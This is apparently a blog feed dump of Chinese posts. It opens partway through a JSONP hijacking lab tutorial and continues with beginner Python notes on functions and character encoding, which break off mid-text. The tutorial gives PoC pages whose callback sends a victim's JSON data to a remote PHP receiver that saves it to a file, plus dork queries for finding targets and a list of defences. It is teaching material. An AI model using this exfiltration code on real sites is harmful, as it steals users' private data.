class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>jsonp劫持<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://apps.badimg.com/libs/jquery/1.10.2/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonp2</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.23.130/jsonp/user.php?callback=jsonp2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e7bca49ac1b644efa9c8c7f15975a8f1.png" alt="在这里插入图片描述"><br>（&#x3D;&#x3D;PS：复现时虚拟机开的环境，所以没有放到VPS中。&#x3D;&#x3D;)<br>整个的流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.用户测试网站发现存在jsonp</span><br><span class="line">2.构造poc</span><br><span class="line">3.诱导用户访问</span><br><span class="line">4.访问恶意的html</span><br><span class="line">5.从响应中获取src对应的url</span><br><span class="line">6.对该url发起请求</span><br><span class="line">7.获取响应的json数据 , 传入回调函数执行 , 弹出敏感信息</span><br></pre></td></tr></table></figure><p>（&#x3D;&#x3D;PS：流程清晰。&#x3D;&#x3D;）<br>这个实验的演示 , 只是简单的通过js代码 , 把敏感信息弹出来 , 证明存在jsonp劫持漏洞 , 如果想要进一步利用可以修改poc的js代码 , 把敏感数据当成参数 , 去请求我们的远程服务器 , 并在接收敏感信息 , 保存到一个文件中</p><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;json.txt&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>jsonp劫持<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://apps.badimg.com/libs/jquery/1.10.2/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonp2</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// alert(JSON.stringify(data));</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// 远程服务器</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// 将拿到的数据写到这里面</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> url = <span class="string">&quot;http://192.168.23.130/1.php?file=&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data);</span></span><br><span class="line"><span class="language-javascript">                        xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">                        xmlhttp.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.23.130/user.php?callback=jsonp2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.130/1.html</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/698bdf953b8247f8b987b221e0149c4c.png" alt="在这里插入图片描述"><br>（&#x3D;&#x3D;PS：在这里烦了个小错，昨天晚上没睡好，今天把1.php和user.php内容反了。&#x3D;&#x3D;)</p><h3 id="（4）Jsonp漏洞危害"><a href="#（4）Jsonp漏洞危害" class="headerlink" title="（4）Jsonp漏洞危害"></a>（4）Jsonp漏洞危害</h3><p>攻击者构造恶意的html页面，利用链接诱导受害者进行点击，从而获取到受害者的敏感信息</p><h3 id="（5）Jsonp漏洞挖掘思路"><a href="#（5）Jsonp漏洞挖掘思路" class="headerlink" title="（5）Jsonp漏洞挖掘思路"></a>（5）Jsonp漏洞挖掘思路</h3><p>google hacking语法 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inurl:json</span><br><span class="line">inurl:callback=</span><br><span class="line">site:a.com inurl:json</span><br></pre></td></tr></table></figure><p>常用关键词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">callback</span><br><span class="line">jsoncallback</span><br><span class="line">jsonpcallback</span><br><span class="line">jsoncall</span><br><span class="line">jsonpcall</span><br><span class="line">cb</span><br><span class="line">jsoncb</span><br><span class="line">jsonpcb</span><br><span class="line">=json</span><br><span class="line">=jsonp</span><br><span class="line">=jQuery </span><br></pre></td></tr></table></figure><p>手工测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f12 , network , 勾选Preserve log , 防止页面刷新跳转的时候访问记录被重置</span><br><span class="line">然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 callback json jsonp jsonpcallback</span><br><span class="line">然后找响应中存在敏感信息的 , 然后构建 poc测试</span><br></pre></td></tr></table></figure><h3 id="（6）防御方案"><a href="#（6）防御方案" class="headerlink" title="（6）防御方案"></a>（6）防御方案</h3><ol><li>json 正确的 http 头输出尽量避免跨域的数据传输，对于同域的数据传输使用 xmlhttp 的方式作为数 据获取的方式，依赖于 javascript 在浏览器域里的安全性保护数据，如果是跨域的数据传输，必须要对敏 感的数据获取做权限认证；</li><li>严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等；</li><li>严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application&#x2F;json; charset&#x3D;utf-8 ）；</li><li>严格过滤 callback 函数名及 JSON 里数据的输出；</li><li>严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)；</li><li>其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：&#x2F;**&#x2F;、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> Jsonp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> Jsonp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（十一）</title>
      <link href="/2022/06/07/python_eleven/"/>
      <url>/2022/06/07/python_eleven/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403135841847.png" alt="在这里插入图片描述"><br>本篇文章记录的是Python函数的基本使用的知识。</p><h1 id="一、函数介绍"><a href="#一、函数介绍" class="headerlink" title="一、函数介绍"></a>一、函数介绍</h1><h2 id="1、什么是函数"><a href="#1、什么是函数" class="headerlink" title="1、什么是函数"></a>1、什么是函数</h2><p>函数就相当于具备某一功能的工具，就像爆米花机，给玉米就会造出爆米花。<br>##2、为什么要用函数<br>组织结构清晰，可读性强<br>代码精简<br>可维护性强，扩展性强<br>##3、如何使用函数<br>先定义<br>后调用<br>返回值<br>#二、函数定义<br>##1、函数定义<br>函数的使用必须遵循先定义，后调用的原则，函数的定义就相当于事先将函数体代码保存起来，然后将内存地址赋值给函数名，函数名就是对这段代码的引用，这和变量的定义是相似的，没有事先定义函数而直接调用，就相当于在引用一个不存在的变量名，同时函数名的命名规范也和变量名一样的，字母数字下划线组成。<br>定义函数的语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">函数名</span>(<span class="params">参数<span class="number">1</span>,参数<span class="number">2</span>,...</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;文档描述&quot;&quot;&quot;</span></span><br><span class="line">    函数体</span><br><span class="line">    <span class="keyword">return</span> 值</span><br><span class="line"></span><br><span class="line"><span class="comment"># def是关键字,return是返回值</span></span><br></pre></td></tr></table></figure><p>定义函数会发生的事情：<br>申请内存空间保存函数体代码<br>将上述内存地址绑定给域名<br>定义函数不会执行函数体代码，但是会检测函数体语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    x</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello word&#x27;</span>)</span><br><span class="line"><span class="comment"># 运行,不报错</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;你好&#x27;</span></span><br><span class="line"><span class="comment"># 运行,报语法错误 </span></span><br></pre></td></tr></table></figure><h2 id="2、三种定义形式"><a href="#2、三种定义形式" class="headerlink" title="2、三种定义形式"></a>2、三种定义形式</h2><h3 id="（1）无参函数"><a href="#（1）无参函数" class="headerlink" title="（1）无参函数"></a>（1）无参函数</h3><p>没有参数的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;无参函数&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">func()</span><br></pre></td></tr></table></figure><p>应用场景：只需要完成某种功能不需要外部的原材料，即不需要参数<br>###（2）有参函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有参数的函数</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y</span>): <span class="comment"># x = 1 y = 2</span></span><br><span class="line">    <span class="built_in">print</span>(x,y)</span><br><span class="line">    </span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>应用场景：函数体需要外部传来的原材料，对其引用，需要有参数传递<br>###（3）空函数<br>函数体代码：PASS（。。。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">func()</span><br></pre></td></tr></table></figure><h1 id="三、调用函数"><a href="#三、调用函数" class="headerlink" title="三、调用函数"></a>三、调用函数</h1><p>函数的调用语法：函数名（）<br>调用函数发生的事情<br>通过函数名找到函数的内存地址<br>通过加括号就是在出发函数体代码的执行<br>##1、语句形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello word&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">func()</span><br></pre></td></tr></table></figure><h2 id="2、表达式形式"><a href="#2、表达式形式" class="headerlink" title="2、表达式形式"></a>2、表达式形式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    x = <span class="number">10</span></span><br><span class="line">    y = <span class="number">20</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line">res = func() <span class="comment"># 利用函数的返回值赋值给res</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h2 id="3、函数调用作为参数"><a href="#3、函数调用作为参数" class="headerlink" title="3、函数调用作为参数"></a>3、函数调用作为参数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x * y</span><br><span class="line"></span><br><span class="line">m = func(func(<span class="number">2</span>,<span class="number">3</span>),<span class="number">9</span>)     <span class="comment">#  func(2,3)的返回值作为函数func的第一个参数</span></span><br></pre></td></tr></table></figure><h1 id="四、函数的返回值"><a href="#四、函数的返回值" class="headerlink" title="四、函数的返回值"></a>四、函数的返回值</h1><p>return是函数结束的标志，即函数体代码一旦运行到return会立刻终止函数的运行<br>若需要将函数体代码执行的结果返回给调用者（函数名（）），则需要用到return，return后无值或直接省略return，则默认返回none，return的返回值无类型限制，且可以将多个返回值放到一个元组内</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.不返回值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func1())  <span class="comment"># None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.返回空值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func2()) <span class="comment"># None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.返回一个值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func3</span>():</span><br><span class="line">    x = <span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func3()) <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.返回多个值,逗号隔开 , 本质是返回一个值 元组</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func4</span>():</span><br><span class="line">    x = <span class="number">10</span></span><br><span class="line">    y = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&#x27;alex&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> x,y</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func4()) <span class="comment"># (10,&#123;&quot;name&quot;:&#x27;alex&#x27;&#125;)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（十）</title>
      <link href="/2022/06/03/python_ten/"/>
      <url>/2022/06/03/python_ten/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403140141222.png" alt="在这里插入图片描述"><br>本篇文章记录的是Python字符编码的知识。</p><h1 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h1><blockquote><p>谈字符编码，首先谈谈和字符相关的知识</p></blockquote><h1 id="一、预备知识"><a href="#一、预备知识" class="headerlink" title="一、预备知识"></a>一、预备知识</h1><h2 id="1、-python的字符相关"><a href="#1、-python的字符相关" class="headerlink" title="1、 python的字符相关"></a>1、 python的字符相关</h2><h3 id="（1）字符串"><a href="#（1）字符串" class="headerlink" title="（1）字符串"></a>（1）字符串</h3><p>我们之前就了解并学习过字符串就是由一串字符组合形成的，毋庸置疑谈字符编码肯定和字符串有关</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/79e3439730c003923dbb83ccecacf09c.png" alt="image-20200806161259074"></p><h3 id="（2）-文本文件"><a href="#（2）-文本文件" class="headerlink" title="（2） 文本文件"></a>（2） 文本文件</h3><p>在我们没有接触python之前，你可能就已经接触了word文件，尤其是在学生时代，各种通知，作业都是word</p><p>word文件本质上就是文本文件，由很多字符组成，只不过当初的你把它叫做汉字或者英文字母。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/b66717943847f883dcc685647b65983d.png" alt="image-20200806161012015"></p><h2 id="2、-三大核心硬件"><a href="#2、-三大核心硬件" class="headerlink" title="2、 三大核心硬件"></a>2、 三大核心硬件</h2><p>首先所有的软件都是运行在硬件之上的，与运行软件相关的三大核心硬件分别为cpu，内存，硬盘。</p><p>首先明确：</p><ol><li><p>软件运行之前，软件的代码以及相关的数据都是保存在硬盘上的</p></li><li><p>任何软件的运行都是把数据从硬盘中读入到内存，然后cpu从内存中取出指令执行</p></li><li><p>软件运行过程中产生的数据都是先保存在内存中的，如果想要永久保存数据，则需要将数据由内存</p><p>写入到硬盘中</p></li></ol><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/1894047-20200818183146047-241681684.png" alt="image-20200807081820830" style="zoom:80%;" /><h2 id="2、-文本编辑器读取文件内容的流程"><a href="#2、-文本编辑器读取文件内容的流程" class="headerlink" title="2、 文本编辑器读取文件内容的流程"></a>2、 文本编辑器读取文件内容的流程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#阶段1、启动一个文件编辑器（文本编辑器如nodepad++，pycharm，word）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#阶段2、文件编辑器会将文件内容从硬盘读入内存</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#阶段3、文本编辑器会将刚刚读入内存中的内容显示到屏幕上</span></span><br></pre></td></tr></table></figure><h2 id="3、-python解释器执行文件的流程"><a href="#3、-python解释器执行文件的流程" class="headerlink" title="3、 python解释器执行文件的流程"></a>3、 python解释器执行文件的流程</h2><p>以python test.py为例，执行流程如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#阶段1、启动python解释器，此时就相当于启动了一个文本编辑器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#阶段2、python解释器相当于文本编辑器，从硬盘上将test.py的内容读入到内存中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#阶段3、python解释器解释执行刚刚读入的内存的内容，开始识别python语法</span></span><br></pre></td></tr></table></figure><h2 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h2><p>python解释器与文件本编辑的异同如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1、相同点：前两个阶段二者完全一致，都是将硬盘中文件的内容读入内存，详解如下</span></span><br><span class="line">python解释器是解释执行文件内容的，因而python解释器具备读py文件的功能，这一点与文本编辑器一样</span><br><span class="line"></span><br><span class="line"><span class="comment">#2、不同点：在阶段3时，针对内存中读入的内容处理方式不同，详解如下</span></span><br><span class="line">文本编辑器将文件内容读入内存后，是为了显示或者编辑，根本不去理会python的语法，而python解释器将文件内容读入内存后，可不是为了给你瞅一眼python代码写的啥，而是为了执行python代码、会识别python语法）</span><br></pre></td></tr></table></figure><h1 id="二、字符编码介绍"><a href="#二、字符编码介绍" class="headerlink" title="二、字符编码介绍"></a>二、字符编码介绍</h1><h2 id="1、-什么是字符编码"><a href="#1、-什么是字符编码" class="headerlink" title="1、 什么是字符编码"></a>1、 什么是字符编码</h2><p>当我们在和计算机进行交互时，用的全都是字符，就是我们人类都够认识的字符，比如中文字符，英文字符等</p><p>但是我们都知道计算机只认识0101这种二进制数字。</p><p>那么我们在打字，编辑文档的时候，一定会经历一个过程就是把我们人类能够认识的字符转化成010101数字</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1dd367f2fbb23669f825b5c2853c87a6.png" alt="image-20200806203313898"></p><p>翻译的时候肯定必须参照一个标准，该标准称之为字符编码表，该表上存放的就是字符与数字一 一对应的关系。</p><p>即人类字符和数字的对应关系的一张表，就是字符编码表。编码就是按照字符编码表翻译的意思，</p><h2 id="2、解释一下你看到的字"><a href="#2、解释一下你看到的字" class="headerlink" title="2、解释一下你看到的字"></a>2、解释一下你看到的字</h2><p>假如你敲了一个<code>牛叉</code>，计算机会参照字符编码表，把牛叉翻译成0101这种二进制数字存到内存中，然后你的文本</p><p>编辑器又从内存中把这串二进制数字从内存中取了出来，按照同一张字符编码表反解成对应的字符，显示出来。</p><p>由于这个过程太快了，你根本感知不到。</p><h1 id="三、字符编码表的发展史"><a href="#三、字符编码表的发展史" class="headerlink" title="三、字符编码表的发展史"></a>三、字符编码表的发展史</h1><blockquote><p>首先计算机是美国人发明的，所以当初设定第一张对照表的是美国人，且只有美国人认识的英文字符。</p></blockquote><h2 id="1、第一张字符编码表——ASCII对照表"><a href="#1、第一张字符编码表——ASCII对照表" class="headerlink" title="1、第一张字符编码表——ASCII对照表"></a>1、第一张字符编码表——ASCII对照表</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/bf2716d605c2b6ea6879d88c79a30762.png" alt="image-20200807081256032"></p><p><strong>ASCII对照表的特点：</strong></p><ol><li>只有英文字符与数字的一一对应关系</li><li>一个英文字符对应1Bytes，1Bytes&#x3D;8bit（位），8bit最多包含256个数字，可以对应256个字符，足够表示所有英文字符</li></ol><p>注意：英文字符不等同英文字母，字符包括：大小写字母，标点符号，数字，空白。</p><h2 id="2、-各种国家的编码表"><a href="#2、-各种国家的编码表" class="headerlink" title="2、 各种国家的编码表"></a>2、 各种国家的编码表</h2><p>虽然电脑是美国人发明的，但是随着历史的发展，各个国家的人们都开始接触，并想使用电脑。</p><p>那么就要提前解决一个问题——就是原本的ASCII对照吧表中没有自己国家语言的字符。</p><p>于是各个国家开始在ASCII编码表的基础上编制自己国家语言的字符编码表。</p><p><strong>gbk（国编码）</strong></p><p>GBK表的特点：</p><ol><li><p>只有中文字符、英文字符与数字的一一对应关系</p></li><li><p>一个英文字符对应1Bytes</p><p>一个中文字符对应2Bytes</p></li></ol><p>补充说明： 1Bytes&#x3D;8bit，8bit最多包含256个数字，可以对应256个字符，足够表示所有英文字符</p><p>​                2Bytes&#x3D;16bit，16bit最多包含65536个数字，可以对应65536个字符，足够表示所有中文字符</p><p>​  实际上英文字符+中文字符+韩文字符+日文字符估计也就才6000多个，但是在gbk编码表中只</p><p>​                有英文+中文字符和数字的对应关系。</p><p><strong>Shift_JIS</strong></p><p>日文编码表，只有日文和英文字符与数字的一一对应关系</p><p><strong>Euc-kr</strong></p><p>韩文编码表，只有韩文和英文字符与数字的一一对应关系</p><p>在那个年代，美国人使用的计算机里面字符编码的标准是ASCII，中国人的是GBK，日本人的是Shift_JIS，</p><p>韩国人的是Euc-kr。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/a099587b3a5acac69c778b98e8d580f0.png" alt="image-20200807103946775"></p><p>在他们的电脑上处理文本文件都是不会出现乱码的，因为在他们的电脑上只有一个标准，无论是存</p><p>文件，还是取文件都按照同一张对照表。</p><p><strong>文本文件的存取原理</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以ASCII对照表为例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.存文本文件</span></span><br><span class="line">人类通过文本编辑器输入的字符,计算机会按照ASCII对照表翻译成对应的二进制存放在内存</span><br><span class="line">    如果想要永久保存,则直接将内存的二进制写入硬盘即可</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 2.取文本文件</span></span><br><span class="line">    将存放在硬盘中的ASCII格式的二进制读到内存中,然后按照ASCII对照表反解成对应的字符</span><br></pre></td></tr></table></figure><h2 id="3、-万国统一-——-unicode"><a href="#3、-万国统一-——-unicode" class="headerlink" title="3、 万国统一 —— unicode"></a>3、 万国统一 —— unicode</h2><p>在此之前各国的计算机上还只是只能输入英文字符+本国字符，但是“贪婪”的我们怎么能甘心这样，最好的</p><p>方式应该是我的计算机能够输入各种国家的字符，而且保证不乱码。于是unicode（万国码）就应运而生了。</p><p>unicode于1990年开始研发，1994年正式公布，具备两大特点：</p><ol 